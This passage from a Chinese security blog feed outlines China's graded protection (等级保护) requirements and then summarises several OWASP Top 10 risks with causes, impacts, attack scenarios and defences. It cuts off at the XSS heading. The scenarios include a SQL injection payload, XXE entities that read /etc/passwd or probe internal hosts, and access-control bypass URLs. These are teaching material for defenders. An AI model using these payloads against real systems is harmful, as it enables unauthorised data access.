class="markdownIt-Anchor" href="#43安全通用要求和安全拓展要求"></a> 4.3安全通用要求和安全拓展要求</h3><p>指的是业务具体的不同，使用技术、应用场景、安保要求有所差异</p><p>安全<mark>通用</mark>要求针对<mark>共性化</mark>保护需求提出</p><p>安全<mark>拓展</mark>要求针对<mark>个性化</mark>保护需求提出</p><h2 id="5-第一级安全要求"><a class="markdownIt-Anchor" href="#5-第一级安全要求"></a> 5、第一级安全要求</h2><h3 id="51安全通用要求"><a class="markdownIt-Anchor" href="#51安全通用要求"></a> 5.1安全通用要求</h3><ul><li>安全物理环境</li></ul><p>物理方向控制，防盗窃，防破坏，放雷击，防火，防水，防潮，温湿度控制，电力供应</p><ul><li>安全计算环境</li></ul><p>身份识别，访问控制，入侵防范，恶意代码防范，可信验证，数据完整性，数据备份恢复</p><ul><li>安全通信网络</li></ul><p>通信传输，可信验证</p><ul><li>安全区域边界</li></ul><p>边界防护，方向控制，可信验证</p><ul><li>安全管理中心</li><li>安全管理机构</li></ul><p>岗位设置，人员配备，授权和审批</p><ul><li>安全管理制度</li></ul><p>管理制度</p><ul><li>安全管理人员</li></ul><p>人员录用，人员离岗，安全意识教育和培训，外部人员访问管理</p><ul><li>安全建设管理</li></ul><p>定级和备案，安全方案设计，产品采购和使用，工程实施，测试验收，系统交付，服务提供商选择</p><ul><li>安全运维管理</li></ul><p>环境管理，介质管理，设备维护管理，漏洞和风险管理，网络和系统安全管理，恶意代码防范管理，备份与恢复管理，安全事件处置</p><h3 id="52云计算安全拓展要求"><a class="markdownIt-Anchor" href="#52云计算安全拓展要求"></a> 5.2云计算安全拓展要求</h3><ul><li>安全物理环境</li></ul><p>基础设备位置</p><ul><li>安全计算环境</li></ul><p>访问控制，数据完整性和保密性</p><ul><li>安全通信网络</li></ul><p>网络架构</p><ul><li>安全区域边界</li></ul><p>访问控制</p><ul><li>安全建设管理</li></ul><p>云服务提供商选择，供应链管理</p><h3 id="53移动互联网安全拓展要求"><a class="markdownIt-Anchor" href="#53移动互联网安全拓展要求"></a> 5.3移动互联网安全拓展要求</h3><ul><li>安全物理环境</li></ul><p>无线接入点的物理位置</p><ul><li>安全计算环境</li></ul><p>移动应用管理</p><ul><li>安全区域边界</li></ul><p>边界防护，访问控制</p><ul><li>安全建设管理</li></ul><p>移动应用软件采购</p><h3 id="54物联网安全拓展要求"><a class="markdownIt-Anchor" href="#54物联网安全拓展要求"></a> 5.4物联网安全拓展要求</h3><ul><li>安全物理环境</li></ul><p>感知节点设备物理防护</p><ul><li>安全区域边界</li></ul><p>接入控制</p><ul><li>安全运维管理</li></ul><p>感知节点管理</p><h3 id="55工业控制系统安全拓展要求"><a class="markdownIt-Anchor" href="#55工业控制系统安全拓展要求"></a> 5.5工业控制系统安全拓展要求</h3><ul><li>安全物理环境</li></ul><p>室外控制设备物理防护</p><ul><li>安全通信网络</li></ul><p>网络架构</p><ul><li>安全区域边界</li></ul><p>访问控制，无线使用控制</p><ul><li>安全计算环境</li></ul><p>控制设备安全</p><h2 id="6-第二级安全要求"><a class="markdownIt-Anchor" href="#6-第二级安全要求"></a> 6、第二级安全要求</h2><h3 id="61安全通用要求"><a class="markdownIt-Anchor" href="#61安全通用要求"></a> 6.1安全通用要求</h3><ul><li>安全物理环境</li></ul><p>物理方向控制，防盗窃，防破坏，放雷击，防火，防水，防潮，温湿度控制，电力供应【防静电，电磁防护，物理位置选择】</p><ul><li>安全计算环境</li></ul><p>身份识别，访问控制，入侵防范，恶意代码防范，可信验证，数据完整性，数据备份恢复</p><ul><li>安全通信网络</li></ul><p>通信传输，可信验证【网络架构】</p><ul><li>安全区域边界</li></ul><p>边界防护，方向控制，可信验证【入侵防范，恶意代码防范，安全审计】</p><ul><li>安全管理中心</li></ul><p>系统管理，审计管理</p><ul><li>安全管理机构</li></ul><p>岗位设置，人员配备，授权和审批【沟通和合作，审核和检查】</p><ul><li>安全管理制度</li></ul><p>管理制度【安全策略，指定和发布，评审和修订】</p><ul><li>安全管理人员</li></ul><p>人员录用，人员离岗，安全意识教育和培训，外部人员访问管理</p><ul><li>安全建设管理</li></ul><p>定级和备案，安全方案设计，产品采购和使用，工程实施，测试验收，系统交付，服务提供商选择【自行软件开发，外包软件开发，等级测评】</p><ul><li>安全运维管理</li></ul><p>环境管理，介质管理，设备维护管理，漏洞和风险管理，网络和系统安全管理，恶意代码防范管理，备份与恢复管理，安全事件处置【资产管理，配置管理，密码管理，变更管理，应急预案管理，外包运维管理】</p><h3 id="62云计算安全拓展要求"><a class="markdownIt-Anchor" href="#62云计算安全拓展要求"></a> 6.2云计算安全拓展要求</h3><ul><li>安全的物理环境</li><li>安全的通信网络</li><li>安全区域边界</li></ul><p>多入侵防范，安全审计</p><ul><li>安全计算环境</li></ul><p>多镜像备份和快照保护，数据备份与恢复，剩余信息保护</p><ul><li>安全建设管理</li><li>安全运维管理</li></ul><p>云计算环境管理</p><h3 id="63移动互联网安全拓展要求"><a class="markdownIt-Anchor" href="#63移动互联网安全拓展要求"></a> 6.3移动互联网安全拓展要求</h3><ul><li>安全的物理环境</li><li>安全区域边界</li></ul><p>多入侵防范</p><ul><li>安全的计算环境</li><li>安全建设管理</li></ul><p>多移动应用软件开发</p><h3 id="64物联网安全拓展要求"><a class="markdownIt-Anchor" href="#64物联网安全拓展要求"></a> 6.4物联网安全拓展要求</h3><ul><li>安全的物理环境</li><li>安全区域边界</li></ul><p>多入侵防范</p><ul><li>安全运维管理</li></ul><h3 id="65工业控制系统安全拓展要求"><a class="markdownIt-Anchor" href="#65工业控制系统安全拓展要求"></a> 6.5工业控制系统安全拓展要求</h3><ul><li>安全的物理环境</li><li>安全通信网络</li></ul><p>多通信传输</p><ul><li>安全区域边界</li></ul><p>多拨号使用控制</p><ul><li>安全计算环境</li><li>安全建设管理</li></ul><p>产品采购和使用，外包软件开发</p><h2 id="7-第三级安全要求"><a class="markdownIt-Anchor" href="#7-第三级安全要求"></a> 7、第三级安全要求</h2><h3 id="71安全通用要求"><a class="markdownIt-Anchor" href="#71安全通用要求"></a> 7.1安全通用要求</h3><ul><li>安全通信网络</li><li>安全区域边界</li></ul><p>恶意代码和垃圾邮件防范</p><ul><li>安全计算环境</li></ul><p>多数据保密性</p><ul><li>安全物理环境</li><li>安全管理中心</li></ul><p>多安全管理，集中管理</p><ul><li>安全管理制度</li><li>安全管理机构</li><li>安全管理人员</li><li>安全建设管理</li><li>安全运维管理</li></ul><h3 id="72云计算安全拓展要求"><a class="markdownIt-Anchor" href="#72云计算安全拓展要求"></a> 7.2云计算安全拓展要求</h3><h3 id="73移动互联网安全拓展要求"><a class="markdownIt-Anchor" href="#73移动互联网安全拓展要求"></a> 7.3移动互联网安全拓展要求</h3><h3 id="74物联网安全拓展要求"><a class="markdownIt-Anchor" href="#74物联网安全拓展要求"></a> 7.4物联网安全拓展要求</h3><h3 id="75工业控制系统安全拓展要求"><a class="markdownIt-Anchor" href="#75工业控制系统安全拓展要求"></a> 7.5工业控制系统安全拓展要求</h3><h2 id="8-第四级安全要求"><a class="markdownIt-Anchor" href="#8-第四级安全要求"></a> 8、第四级安全要求</h2><p>大框架和第三级一样</p>]]></content>
      
      
      <categories>
          
          <category> 等级保护 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OWASP TOP10</title>
      <link href="/2020/11/23/OWASP%20TOP10/"/>
      <url>/2020/11/23/OWASP%20TOP10/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="注入"><a class="markdownIt-Anchor" href="#注入"></a> 注入</h1><p>将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如SQL注入、 NoSQL注入、 OS注入和LDAP注入的注入缺陷。攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预期命令或访问数据。</p><h2 id="漏洞成因"><a class="markdownIt-Anchor" href="#漏洞成因"></a> 漏洞成因</h2><ul><li><p>用户提供的数据没有经过应用程序的验证、过滤或净化。</p></li><li><p>动态查询语句或非参数化的调用，在没有上下文感知转义的情况下，被用于解释器。</p></li><li><p>在ORM搜索参数中使用了恶意数据，这样搜索就获得包含敏感或未授权的数据。</p></li><li><p>恶意数据直接被使用或连接，诸如SQL语句或命令在动态查询语句、命令或存储过程中包含结构和恶意数据。</p><p>一些常见的注入，包括： SQL、 OS命令、 ORM、 LDAP和表达式语言（EL）或OGNL注入。所有解释器的概念都是相同的。</p></li></ul><h2 id="检测方法"><a class="markdownIt-Anchor" href="#检测方法"></a> 检测方法</h2><p>代码评审是最有效的检测应用程序的注入风险的办法之一【静态应用程序安全测试（SAST）工具】</p><p>紧随其后的是对所有参数、字段、头、 cookie、 JSON和XML数据输入的彻底的DAST【动态应用程序安全测试工具】扫描。</p><h2 id="漏洞位置"><a class="markdownIt-Anchor" href="#漏洞位置"></a> 漏洞位置</h2><p>注入漏洞 通常能在SQL、 LDAP、 XPath或是NoSQL查询语句、 OS 命令、 XML解析器、 SMTP包头、表达式语句及ORM查询语句中找到。</p><h2 id="危害"><a class="markdownIt-Anchor" href="#危害"></a> 危害</h2><p>注入能导致数据丢失、破坏或泄露给无授权方，缺乏可审计性或是拒绝服务。注入有时甚至能导致主机被完全接管。</p><h2 id="攻击案例场景"><a class="markdownIt-Anchor" href="#攻击案例场景"></a> 攻击案例场景</h2><p>场景#1：应用程序在下面存在脆弱性的SQL语句的构造中使用不可信数据：<br />String query = “SELECT * FROM accounts WHERE custID=’” + request.getParameter(“id”) + &quot;’“;</p><p>场景#2：同样的，框架应用的盲目信任，仍然可能导致查询语句的漏洞。（例如： ibernate查询语言（HQL））：Query HQLQuery = session.createQuery(“FROM accounts WHERE custID=’” + request.getParameter(“id”) + “’”);</p><p>在这两个案例中，攻击者在浏览器中将“id”参数的值修改成： ’or’1’=’1。例如：<br /><a href="http://example.com/app/accountView?id=" target="_blank" rel="noopener">http://example.com/app/accountView?id=</a>’ or ‘1’='1这样查询语句的意义就变成了从accounts表中返回所有的记录。更危险的攻击可能导致数据被篡改甚至是存储过程被调用。</p><h2 id="预防措施"><a class="markdownIt-Anchor" href="#预防措施"></a> 预防措施</h2><p>防止注入漏洞需要将数据与命令语句、查询语句分隔开来。</p><ul><li>最佳选择是使用安全的API，完全避免使用解释器，或提供参数化界面的接口，或迁移到ORM或实体框架。<br />注意： 当参数化时，存储过程仍然可以引入SQL注入，如果PL/SQL或T-SQL将查询和数据连接在一起，或者执行带有立即执行或exec()的恶意数据。</li><li>使用正确的或“白名单”的具有恰当规范化的输入验证方法同样会有助于防止注入攻击，但这不是一个完整的防御，因为许多应用程序在输入中需要特殊字符，例如文本区域或移动应用程序的API。</li><li>对于任何剩余的动态查询，可以使用该解释器的特定转义语法转义特殊字符。 OWASP的Java Encoder和类似的库提供了这样的转义例程。<br />注意： SQL结构，比如：表名、列名等无法转义，因此用户提供的结构名是非常危险的。这是编写软件中的一个常见问题。</li><li>在查询中使用LIMIT和其他SQL控件，以防止在SQL注入时大量地泄露记录。</li></ul><h1 id="失效的身份认证"><a class="markdownIt-Anchor" href="#失效的身份认证"></a> 失效的身份认证</h1><p>通常，通过错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，或者利用其它开发缺陷来暂时性或永久性冒充其他用户的身份。</p><h2 id="漏洞成因-2"><a class="markdownIt-Anchor" href="#漏洞成因-2"></a> 漏洞成因</h2><ul><li>允许凭证填充，这使得攻击者获得有效用户名和密码的列表。</li><li>允许暴力破解或其他自动攻击。</li><li>允许默认的、弱的或众所周知的密码，例如“Password1”或“admin/admin” 。</li><li>使用弱的或失效的验证凭证，忘记密码程序，例如“基于知识的答案”，这是不安全的。</li><li>使用明文、加密或弱散列密码（参见： A3:2017-敏感数据泄露）。</li><li>缺少或失效的多因素身份验证。</li><li>暴露URL中的会话ID（例如URL重写）。</li><li>在成功登录后不会更新会话ID。</li><li>不正确地使会话ID失效。当用户不活跃的时候，用户会话或认证令牌（特别是单点登录（SSO）令牌）没有正确注销或失效。</li></ul><h2 id="漏洞位置-2"><a class="markdownIt-Anchor" href="#漏洞位置-2"></a> 漏洞位置</h2><p>会话管理是身份验证和访问控制的基础，并且存在于所有有状态应用程序中。</p><h2 id="危害-2"><a class="markdownIt-Anchor" href="#危害-2"></a> 危害</h2><p>攻击者只需要访问几个帐户，或者只需要一个管理员帐户就可以破坏我们的系统。根据应用程序领域的不同，可能会导致放任洗钱、社会安全欺诈以及用户身份盗窃、泄露法律高度保护的敏感信息。</p><h2 id="攻击案例场景-2"><a class="markdownIt-Anchor" href="#攻击案例场景-2"></a> 攻击案例场景</h2><p>场景#1： 凭证填充，使用已知密码的列表，是常见的攻击。如果应用程序不限制身份验证尝试，则可以将应用程序用作密码oracle，以确定凭证是否有效。</p><p>场景#2：大多数身份验证攻击都是由于使用密码作为唯一的因素。依据最佳实践，最新的密码轮换和复杂性要求鼓励用户使用、重用以及重用弱密码。 建议组织在NIST-800-63中停止这些实践，并使用多因素身份验证。</p><p>场景#3：应用会话超时设置不正确。用户使用公共计算机访问应用程序。用户直接关闭浏览器选项卡就离开，而不是选择“注销”。攻击者一小时后使用同一个浏览器浏览网页，而当前用户状态仍然是经过身份验证的。</p><h2 id="预防措施-2"><a class="markdownIt-Anchor" href="#预防措施-2"></a> 预防措施</h2><ul><li>在可能的情况下，实现多因素身份验证，以防止自动、凭证填充、暴力破解和被盗凭据再利用攻击。</li><li>不要使用发送或部署默认的凭证，特别是管理员用户。</li><li>执行弱密码检查，例如测试新或变更的密码，以纠正“排名前10000个弱密码” 列表。</li><li>将密码长度、复杂性和循环策略与NIST-800-63 B的指导方针的5.1.1章节-记住秘密，或其他现代的基于证据的密码策略相一致。</li><li>确认注册、凭据恢复和API路径，通过对所有输出结果使用相同的消息，用以抵御账户枚举攻击。</li><li>限制或逐渐延迟失败的登录尝试。记录所有失败信息并在凭据填充、暴力破解或其他攻击被检测时提醒管理员。</li><li>使用服务器端安全的内置会话管理器，在登录后生成高度复杂的新随机会话ID。会话ID不能在URL中，可以安全地存储和当登出、闲置、绝对超时后使其失效。</li></ul><h1 id="敏感数据泄露"><a class="markdownIt-Anchor" href="#敏感数据泄露"></a> 敏感数据泄露</h1><p>许多Web应用程序和API都无法正确保护敏感数据，例如：财务数据、医疗数据和PII数据。攻击者可以通过窃取或修改未加密的数据来实施信用卡诈骗、身份盗窃或其他犯罪行为。未加密的敏感数据容易受到破坏，因此，我们需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据以及浏览器的交互数据</p><h2 id="漏洞成因-3"><a class="markdownIt-Anchor" href="#漏洞成因-3"></a> 漏洞成因</h2><ul><li>在数据传输过程中是否使用明文传输？这和传输协议相关，如：HTTP、 SMTP和FTP。外部网络流量非常危险。验证所有的内部通信，如：负载平衡器、 Web服务器或后端系统之间的通信。</li><li>当数据被长期存储时，无论存储在哪里，它们是否都被加密，包含备份数据？</li><li>无论默认条件还是源代码中，是否还在使用任何旧的或脆弱的加密算法？</li><li>是否使用默认加密密钥，生成或重复使用脆弱的加密密钥，或者缺少恰当的密钥管理或密钥回转？</li><li>是否强制加密敏感数据，例如：用户代理（如：浏览器）指令和传输协议是否被加密？</li><li>用户代理（如：应用程序、邮件客户端）是否未验证服务器端证书的有效性？</li></ul><h2 id="漏洞位置-3"><a class="markdownIt-Anchor" href="#漏洞位置-3"></a> 漏洞位置</h2><ul><li>传输过程中</li><li>存储数据</li></ul><h2 id="危害-3"><a class="markdownIt-Anchor" href="#危害-3"></a> 危害</h2><p>泄露敏感信息 通常情况下，这些数据 通常包括很多个人敏感信息（PII）， 例如：医疗记录、认证凭证、个人隐私、信用卡信息等。</p><h2 id="攻击案例场景-3"><a class="markdownIt-Anchor" href="#攻击案例场景-3"></a> 攻击案例场景</h2><p>场景 #1： 一个应用程序使用自动化的数据加密系统加密信用卡信息，并存储在数据库中。但是，当数据被检索时被自动解密，这就使得SQL注入漏洞能够以明文形式获得所有信用卡卡号。</p><p>场景 #2： 一个网站上对所有网页没有使用或强制使用TLS，或者使用弱加密。攻击者通过监测网络流量（如：不安全的无线网络），将网络连接从HTTPS降级到HTTP，就可以截取请求并窃取用户会话cookie。 之后，攻击者可以复制用户cookie并成功劫持经过认证的用户会话、访问或修改用户个人信息。除此之外，攻击者还可以更改所有传输过程中的数据，例如：转款的接接收者。</p><p>场景 #3： 密码数据库使用未加盐的哈希算法或弱哈希算法去存储每个人的密码。一个文件上传漏洞使黑客能够获取密码文件。所有这些未加盐哈希的密码通过彩虹表暴力破解方式破解。 由简单或快速散列函数生成加盐的哈希，也可以通过GPU破解。</p><h2 id="预防措施-3"><a class="markdownIt-Anchor" href="#预防措施-3"></a> 预防措施</h2><ul><li>对系统处理、存储或传输的数据分类，并根据分类进行访问控制。</li><li>熟悉与敏感数据保护相关的法律和条例，并根据每项法规要求保护敏感数据。</li><li>对于没必要存放的、重要的敏感数据，应当尽快清除，或者通过PCI DSS标记或拦截。未存储的数据不能被窃取。</li><li>确保存储的所有敏感数据被加密。</li><li>确保使用了最新的、强大的标准算法或密码、参数、协议和密匙，并且密钥管理到位。</li><li>确保传输过程中的数据被加密，如：使用TLS。 确保数据加密被强制执行，如：使用HTTP严格安全传输协议（HSTS ）。</li><li>禁止缓存对包含敏感数据的响应。</li><li>确保使用密码专用算法存储密码，如： Argon2 、 scrypt 、bcrypt 或者PBKDF2 。将工作因素（延迟因素）设置在可接受范围。</li><li>单独验证每个安全配置项的有效性。</li></ul><h1 id="xml外部实体xxe"><a class="markdownIt-Anchor" href="#xml外部实体xxe"></a> XML外部实体（XXE）</h1><p>许多较早的或配置错误的XML处理器评估了XML文件中的外部实体引用。攻击者可以利用外部实体窃取使用URI文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻击。</p><h2 id="漏洞成因-4"><a class="markdownIt-Anchor" href="#漏洞成因-4"></a> 漏洞成因</h2><ul><li>您的应用程序直接接受XML文件或者接受XML文件上传，特别是来自不受信任源的文件，或者将不受信任的数据插入XML文件，并提交给XML处理器解析。</li><li>在应用程序或基于Web服务的SOAP中，所有XML处理器都启用了文档类型定义（DTDs） 。因为禁用DTD进程的确切机制因处理器而不同，更多资料请参考： 《OWASP Cheat Sheet ‘XXEPrevention‘ 》 。</li><li>如果为了实现安全性或单点登录（SSO），您的应用程序使用SAML进行身份认证。而SAML使用XML进行身份确认，那么您的应用程序就容易受到XXE攻击。</li><li>如果您的应用程序使用第1.2版之前的SOAP，并将XML实体传递到SOAP框架，那么它可能受到XXE攻击。</li><li>存在XXE缺陷的应用程序更容易受到拒绝服务攻击，包括：Billion Laughs 攻击。</li></ul><h2 id="检测方法-2"><a class="markdownIt-Anchor" href="#检测方法-2"></a> 检测方法</h2><p>SAST 工具可以通过检查依赖项和安全配置来发现 XXE缺陷。 DAST工具需要额外的手动步骤来检测和利用XXE缺陷。</p><h2 id="漏洞位置-4"><a class="markdownIt-Anchor" href="#漏洞位置-4"></a> 漏洞位置</h2><p>默认情况下，许多旧的XML处理器能够对外部实体、 XML进程中被引用和评估的URI进行规范。</p><h2 id="危害-4"><a class="markdownIt-Anchor" href="#危害-4"></a> 危害</h2><p>XXE缺陷可用于提取数据、执行远程服务器请求、扫描内部系统、执行拒绝服务攻击和其他攻击。</p><h2 id="攻击案例场景-4"><a class="markdownIt-Anchor" href="#攻击案例场景-4"></a> 攻击案例场景</h2><p>场景 #1：攻击者尝试从服务端提取数据：</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">foo</span> <span class="hljs-meta-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"file:///etc/passwd"</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br></code></pre></td></tr></table></figure><p>场景 #2：攻击者通过将上面的实体行更改为以下内容来探测服务器的专用网络：</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"https://192.168.1.1/private"</span> &gt;</span>]&gt;<br></code></pre></td></tr></table></figure><p>场景 #3：攻击者通过恶意文件执行拒绝服务攻击：</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"file:///dev/random"</span> &gt;</span>]&gt;<br></code></pre></td></tr></table></figure><h2 id="预防措施-4"><a class="markdownIt-Anchor" href="#预防措施-4"></a> 预防措施</h2><ul><li>尽可能使用简单的数据格式（如： JSON），避免对敏感数据进行序列化。</li><li>及时修复或更新应用程序或底层操作系统使用的所有XML处理器和库。同时，通过依赖项检测，将SOAP更新到1.2版本或更高版本。</li><li>参考《 OWASP Cheat Sheet ‘XXE Prevention‘ 》 ，在应用程序的所有XML解析器中禁用XML外部实体和DTD进程。</li><li>在服务器端实施积极的（“白名单”）输入验证、过滤和清理，以防止在XML文档、标题或节点中出现恶意数据。</li><li>验证XML或XSL文件上传功能是否使用XSD验证或其他类似验证方法来验证上传的XML文件。</li><li>尽管在许多集成环境中，手动代码审查是大型、复杂应用程序的最佳选择，但是SAST 工具可以检测源代码中的XXE漏洞。</li></ul><h1 id="失效的访问控制"><a class="markdownIt-Anchor" href="#失效的访问控制"></a> 失效的访问控制</h1><p>未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。</p><h2 id="漏洞成因-5"><a class="markdownIt-Anchor" href="#漏洞成因-5"></a> 漏洞成因</h2><p>访问控制强制实施策略，使用户无法在其预期的权限之外执行行为。失败的访问控制通常导致未经授权的信息泄露、修改或销毁所有数据、或在用户权限之外执行业务功能。常见的访问控制脆弱点包括：</p><ul><li>通过修改 URL、内部应用程序状态或 HTML 页面绕过访问控制检查，或简单地使用自定义的 API 攻击工具。</li><li>允许将主键更改为其他用户的记录，例如查看或编辑他人的帐户。</li><li>特权提升。在不登录的情况下假扮用户，或以用户身份登录时充当管理员。</li><li>元数据操作，如重放或篡改 JWT 访问控制令牌，或作以提升权限的cookie 或隐藏字段。</li><li>CORS配置错误允许未授权的API访问。</li><li>以未通过身份验证的用户身份强制浏览的通过身份验证时才能看到的页面、或作为标准用户访问具有相关权限的页面、或API没有对POST、 PUT和DELETE强制执行访问控制。</li></ul><h2 id="检测方法-3"><a class="markdownIt-Anchor" href="#检测方法-3"></a> 检测方法</h2><p>SAST 工具和 DAST 工具可以检测到访问控制的缺失，但 不能验证其功能是否正常。访问控制 可通过手动方式检测，或在某些特定框架下通过自动化检测访问控制缺失。由于缺乏自动化的检测和应用程序开发人员缺乏有效 的功能测试，因而访问控制缺陷很常。 访问控制检测通常不适用于自动化的静态或动态测试。 手动测试是检测访问控制缺失或失效的最佳方法，包 括： HTTP方法（如： GET和PUT）、控制器、直接对象引用等。</p><h2 id="危害-5"><a class="markdownIt-Anchor" href="#危害-5"></a> 危害</h2><p>技术影响是攻击者可以冒充用户、管理员或拥有特权的用户，或者创建、 访问、更新或删除任何记录。 业务影响取决于应用程序和数据的保护需求。</p><h2 id="攻击案例场景-5"><a class="markdownIt-Anchor" href="#攻击案例场景-5"></a> 攻击案例场景</h2><p>场景 #1：应用程序在访问帐户信息的 SQL调用中使用了未经验证的数据：</p><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">pstmt.setString(1， request.getParameter(&quot;acct&quot;));<br>ResultSet results &#x3D; pstmt.executeQuery( );<br></code></pre></td></tr></table></figure><p>攻击者只需修改浏览器中的“acct”参数即可发送他们想要的任何帐号信息。如果没有正确验证，攻击者可以访问任何用户的帐户。</p><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">http:&#x2F;&#x2F;example.com&#x2F;app&#x2F;accountInfo?acct&#x3D;notmyacct<br></code></pre></td></tr></table></figure><p>场景 #2：攻击者仅强制浏览目标URL。管理员权限是访问管理页面所必需的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">http:&#x2F;&#x2F;example.com&#x2F;app&#x2F;getappInfo<br>http:&#x2F;&#x2F;example.com&#x2F;app&#x2F;admin_getappInfo<br></code></pre></td></tr></table></figure><p>如果一个未经身份验证的用户可以访问任何页面，那么这是一个缺陷。如果一个非管理员权限的用户可以访问管理页面，那么这同样也是一个缺陷。</p><h2 id="预防措施-5"><a class="markdownIt-Anchor" href="#预防措施-5"></a> 预防措施</h2><p>访问控制只有在受信服务器端代码或没有服务器的 API 中有效，这样这样攻击者才无法修改访问控制检查或元数据。</p><ul><li>除公有资源外，默认情况下拒绝访问。</li><li>使用一次性的访问控制机制，并在整个应用程序中不断重用它们，包括最小化CORS使用。</li><li>建立访问控制模型以强制执行所有权记录，而不是接受用户创建、读取、更新或删除的任何记录。</li><li>域访问控制对每个应用程序都是唯一的，但业务限制要求应由域模型强制执行。</li><li>禁用 Web服务器目录列表，并确保文件元数据（如： git）不存在于 Web的根目录中。</li><li>记录失败的访问控制，并在适当时向管理员告警（如：重复故障）。</li><li>对API和控制器的访问进行速率限制，以最大限度地降低自动化攻击工具的危害。</li><li>当用户注销后，服务器上的JWT令牌应失效。</li></ul><h1 id="安全配置错误"><a class="markdownIt-Anchor" href="#安全配置错误"></a> 安全配置错误</h1><p>安全配置错误是最常见的安全问题，这通常是由于不安全的默认配置、不完整的临时配置、开源云存储、错误的 HTTP 标头配置以及包含敏感信息的详细错误信息所造成的。因此，我们不仅需要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。</p><h2 id="漏洞成因-6"><a class="markdownIt-Anchor" href="#漏洞成因-6"></a> 漏洞成因</h2><ul><li>应用程序栈堆的任何部分都缺少适当的安全加固，或者云服务的权限配置错误。</li><li>应用程序启用或安装了不必要的功能（例如：不必要的端口、服务、网页、帐户或权限）。</li><li>默认帐户的密码仍然可用且没有更改。</li><li>错误处理机制向用户披露堆栈跟踪或其他大量错误信息。</li><li>对于更新的系统，禁用或不安全地配置最新的安全功能。</li><li>应用程序服务器、应用程序框架（如： Struts、 Spring、<br /><a href="http://ASP.NET" target="_blank" rel="noopener">ASP.NET</a>）、库文件、数据库等没有进行安全配置。</li><li>服务器不发送安全标头或指令，或者未对服务器进行安全配置。</li><li>您的应用软件已过期或易受攻击（参见A9： 2017-使用含有已知漏洞的组件）。</li></ul><h2 id="检测方法-4"><a class="markdownIt-Anchor" href="#检测方法-4"></a> 检测方法</h2><p>自动扫描器可用于检测错误的安全配置、默 认帐户的使用或配置、不必要的服务、遗留选项等。</p><h2 id="漏洞位置-5"><a class="markdownIt-Anchor" href="#漏洞位置-5"></a> 漏洞位置</h2><p>安全配置错误可以发生在一个应用程序堆栈的任何层面，包括网络服务、平台、 Web服务器、应用服务器、 数据库、框架、自定义代码和预安装的虚拟机、容器 和存储。</p><h2 id="危害-6"><a class="markdownIt-Anchor" href="#危害-6"></a> 危害</h2><p>这些漏洞使攻击者能经常访问一些未授权的系统数据或功能。有时，这些漏洞导致系统的完全攻破。 业务影响取决于您的应用程序和数据的保护需求。</p><h2 id="攻击案例场景-6"><a class="markdownIt-Anchor" href="#攻击案例场景-6"></a> 攻击案例场景</h2><p>场景#1：应用程序服务器附带了未从产品服务器中删除的应用程序样例。这些样例应用程序具有已知的安全漏洞，攻击者利用这些漏洞来攻击服务器。如果其中一个应用程序是管理员控制台，并且没有更改默认账户，攻击者就可以通过默认密码登录，从而接管服务器。<br />场景#2：目录列表在服务器端未被禁用。攻击者发现他们很容易就能列出目录列表。攻击者找到并下载所有已编译的Java类，他们通过反编译来查看代码。然后，攻击者在应用程序中找到一个严重的访问控制漏洞。<br />场景#3：应用服务器配置允许将详细的错误信（如：堆栈跟踪信息）返回给用户，这可能会暴露敏感信息或潜在的漏洞，如：已知含有漏洞的组件的版本信息。<br />场景#4：云服务向其他CSP用户提供默认的网络共享权限。这允许攻击者访问存储在云端的敏感数据</p><h2 id="预防措施-6"><a class="markdownIt-Anchor" href="#预防措施-6"></a> 预防措施</h2><ul><li>一个可以快速且易于部署在另一个锁定环境的可重复的加固过程。开发、质量保证和生产环境都应该进行相同配置，并且，在每个环境中使用不同的密码。这个过程应该是自动化的，以尽量减少安装一个新安全环境的耗费。</li><li>搭建最小化平台，该平台不包含任何不必要的功能、组件、文档和示例。移除或不安装不适用的功能和框架。</li><li>检查和修复安全配置项来适应最新的安全说明、更新和补丁，并将其作为更新管理过程的一部分，（参见A9： 2017-使用含有已知漏洞的组件）。在检查过程中，应特别注意云存储权限（如：S3桶权限）。</li><li>一个能在组件和用户间提供有效的分离和安全性的分段应用程序架构，包括：分段、容器化和云安全组。</li><li>向客户端发送安全指令，如： 安全标头。</li><li>在所有环境中能够进行正确安全配置和设置的自动化过程。</li></ul><h1 id="跨站脚本xss"><a class="markdownIt-Anchor" href="#跨站脚本xss"></a> 